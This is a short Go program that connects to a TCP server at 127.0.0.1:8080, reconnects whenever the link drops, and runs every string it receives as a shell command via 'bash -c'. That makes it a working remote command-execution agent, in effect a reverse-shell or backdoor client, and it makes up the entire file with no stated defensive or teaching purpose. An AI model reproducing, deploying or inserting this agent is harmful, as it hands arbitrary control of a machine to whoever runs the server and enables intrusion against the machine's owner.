package main

import (
	"fmt"
	"net"
	"os/exec"
	"time"
)

func main() {
	serverAddr := "127.0.0.1:8080"
	var conn net.Conn

	for {
		if conn == nil {
			newConn, err := net.Dial("tcp", serverAddr)
			if err != nil {
				fmt.Println("Error connecting to the server:", err)
				time.Sleep(time.Second) // Wait before attempting to reconnect
				continue
			}
			fmt.Println("Connected to the server")
			conn = newConn

			go func() {
				defer conn.Close()

				buffer := make([]byte, 1024)

				for {
					n, err := conn.Read(buffer)
					if err != nil {
						fmt.Println("Error receiving data:", err)
						conn = nil // Set conn to nil to trigger reconnection
						break      // Exit the goroutine on error
					}

					receivedData := string(buffer[:n])
					fmt.Println("Received from server:\n", receivedData)
					output, err := executeCommand(receivedData)
					if err != nil {
						fmt.Println("Error executing command:", err)
						continue
					}
					fmt.Println("Command executed:\n", output)
				}
			}()
		}

		// Add a short delay before attempting to reconnect
		time.Sleep(time.Second)
	}
}

func executeCommand(code string) (string, error) {
	cmd := exec.Command("bash", "-c", code)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	return string(output), nil
}
